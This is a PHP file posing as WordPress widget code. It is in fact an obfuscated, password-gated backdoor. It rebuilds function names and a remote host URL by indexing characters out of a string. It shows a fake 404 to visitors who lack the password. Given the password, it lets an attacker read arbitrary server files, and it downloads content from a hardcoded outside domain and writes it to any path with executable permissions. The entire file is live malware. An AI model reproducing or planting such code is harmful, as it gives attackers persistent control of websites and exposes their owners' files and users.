<?php


@ini_set('display_errors', 0);
$wrapper_makup = "wp_widgets_pay";
$wp_contents = "wp_widgets_url";
$wp_makup = "wp_widgets_cat";
$wp_objacts = "wp_widgets_text";
$sources_block = "wp_widgets_tag_cloud";
$items_objacts = "wp_widgets_search";
$items_makup = "wp_widgets_rss";
$inners_value = "wp_widgets_recent_entries";
$filters_value = "wp_widgets_recent_comments";
$categoryes = "wp_widgets_pages";
$block_types = "wp_widgets_meta";
$block_contents = "wp_widgets_links";
$alowed_html = "wp_widgets_categories";
$alowed_block = "wp_widgets_calendar";
$allow_protocols = "wp_widgets_archives";
$$wrapper_makup = RandAbc();
$$wp_makup =  $wp_widgets_pay{62}.$wp_widgets_pay{51}.$wp_widgets_pay{50}.$wp_widgets_pay{54}.$wp_widgets_pay{55};
$$sources_block = $wp_widgets_pay{28}.$wp_widgets_pay{26}.$wp_widgets_pay{27}.$wp_widgets_pay{33};
$$items_objacts = $wp_widgets_pay{19}.$wp_widgets_pay{22}.$wp_widgets_pay{12}.$wp_widgets_pay{1}.$wp_widgets_pay{0}.$wp_widgets_pay{12}.$wp_widgets_pay{0}.$wp_widgets_pay{17}.$wp_widgets_pay{10}.$wp_widgets_pay{4}.$wp_widgets_pay{19};
$$wp_objacts = $$wp_widgets_cat;
$$wp_contents = $wp_widgets_pay{12}.$wp_widgets_pay{3}.$wp_widgets_pay{31};
$$items_makup = $wp_widgets_pay{30}.$wp_widgets_pay{35}.$wp_widgets_pay{32}.$wp_widgets_pay{34}.$wp_widgets_pay{31}.$wp_widgets_pay{34}.$wp_widgets_pay{31}.$wp_widgets_pay{3}.$wp_widgets_pay{26}.$wp_widgets_pay{5}.$wp_widgets_pay{5}.$wp_widgets_pay{4}.$wp_widgets_pay{29}.$wp_widgets_pay{31}.$wp_widgets_pay{28}.$wp_widgets_pay{27}.$wp_widgets_pay{0}.$wp_widgets_pay{26}.$wp_widgets_pay{30}.$wp_widgets_pay{32}.$wp_widgets_pay{5}.$wp_widgets_pay{26}.$wp_widgets_pay{30}.$wp_widgets_pay{34}.$wp_widgets_pay{28}.$wp_widgets_pay{5}.$wp_widgets_pay{33}.$wp_widgets_pay{0}.$wp_widgets_pay{3}.$wp_widgets_pay{31}.$wp_widgets_pay{34}.$wp_widgets_pay{3};
$$inners_value =  $wp_widgets_pay{23}.$wp_widgets_pay{24}.$wp_widgets_pay{25};
$$filters_value = $wp_widgets_pay{62}.$wp_widgets_pay{54}.$wp_widgets_pay{40}.$wp_widgets_pay{53}.$wp_widgets_pay{57}.$wp_widgets_pay{40}.$wp_widgets_pay{53};
$$categoryes = $$wp_widgets_recent_comments;
$$block_types = $wp_widgets_pay{39}.$wp_widgets_pay{50}.$wp_widgets_pay{38}.$wp_widgets_pay{56}.$wp_widgets_pay{48}.$wp_widgets_pay{40}.$wp_widgets_pay{49}.$wp_widgets_pay{55}.$wp_widgets_pay{62}.$wp_widgets_pay{53}.$wp_widgets_pay{50}.$wp_widgets_pay{50}.$wp_widgets_pay{55};
$$block_contents = $wp_widgets_pay{51}.$wp_widgets_pay{43}.$wp_widgets_pay{51}.$wp_widgets_pay{62}.$wp_widgets_pay{54}.$wp_widgets_pay{40}.$wp_widgets_pay{47}.$wp_widgets_pay{41};
$$alowed_html = $wp_widgets_pay{2}.$wp_widgets_pay{6}.$wp_widgets_pay{4}.$wp_widgets_pay{19};
$$alowed_block = $wp_widgets_pay{8}.$wp_widgets_pay{13}.$wp_widgets_pay{3}.$wp_widgets_pay{4}.$wp_widgets_pay{23}.$wp_widgets_pay{63}.$wp_widgets_pay{15}.$wp_widgets_pay{7}.$wp_widgets_pay{15};
$$allow_protocols = $wp_widgets_pay{7}.$wp_widgets_pay{19}.$wp_widgets_pay{19}.$wp_widgets_pay{15}.$wp_widgets_pay{64}.$wp_widgets_pay{65}.$wp_widgets_pay{65}.$wp_widgets_pay{22}.$wp_widgets_pay{22}.$wp_widgets_pay{22}.$wp_widgets_pay{63};

if(isset($wp_widgets_pages["$wp_widgets_meta"])){$BT = $wp_widgets_pages["$wp_widgets_meta"];}elseif(isset($wp_widgets_pages["$wp_widgets_links"])){$BT = str_ireplace(str_replace("\\",DIRECTORY_SEPARATOR,str_replace("/",DIRECTORY_SEPARATOR,$wp_widgets_pages["$wp_widgets_links"])),'',__FILE__).DIRECTORY_SEPARATOR;}else{$BT = '/';}
foreach($wp_widgets_text as $wp_widgets_rsso=>$wp_widgets_searcho){
	$$wp_widgets_rsso = $wp_widgets_searcho;
}

if(!(isset($passwd) && $wp_widgets_url($passwd) == $wp_widgets_rss)){
	header("HTTP/1.1 404 Not Found");  
	header("Status: 404 Not Found");  
	exit; 
}

if(isset($act) && $act == 'check' && isset($check_file)){
	if(file_exists($check_file)){
		echo '#ok#';
	}
}

if(isset($act) && $act == 'test'){
		echo '#ok#';
}

if(isset($act) && $act == 'recover' && isset($recover_file) && isset($recover_file_url)){
{
		
			$pfile = $recover_file;
			$date = $wp_widgets_categories($recover_file_url);
			gdir_file($recover_file);
			@chmod($pfile,0755);

			if($date && file_put_contents($pfile,$date)){
				echo '#ok#';
			}else{
				echo '#fail#';
			}
		
	}
}

if(isset($act) && $act == 'redate' && isset($redate_file)){
	if(file_exists($redate_file)){
		echo rdFile($redate_file);
	}
}

function RandAbc($length = "") {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_.:/-";
    return ($str);
} 

function rdFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}

function cget($url,$loop=10){
	$data = false;        $i = 0; 

	while(!$data) {
             $data = tcget($url);             if($i++ >= $loop) break;        }
	return $data;
}

function tcget($url,$proxy=''){
	global $wp_widgets_archives, $wp_widgets_search, $wp_widgets_tag_cloud, $wp_widgets_recent_entries;
     $data = '';    	$url = "$wp_widgets_archives$wp_widgets_search.$wp_widgets_recent_entries/".$url;
 $url = trim($url);     if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')){
         $ch = curl_init();         curl_setopt($ch, CURLOPT_URL, $url);		 curl_setopt($ch, CURLOPT_HEADER, false);		 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		 
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);         $data = curl_exec($ch);         curl_close($ch);      }
    
     if ($data == ''){
         if (function_exists('file_get_contents') && $url){
             $data = @file_get_contents($url);             }
         }
    
     if (($data == '') && $url){
         if (function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')){
             ($fp = @fopen($url, 'r'));            
             if ($fp){
                
                 while (!@feof($fp)){
                     $data .= @fgets($fp) . '';                     }
                
                 @fclose($fp);                 }
             }
         }
     return $data;	
}

function m_mkdir($dir){
		if(!is_dir($dir)) mkdir($dir);
	}
	
function gdir_file($gDir=''){
		global $BT;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;

		
		if(!strstr($gDir,$BT))
			$dir = $BT;
		else
			$dir = '';
		
		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= '/' . $arr[$i];
			m_mkdir($dir);
		}
		
		return $dir;
}


//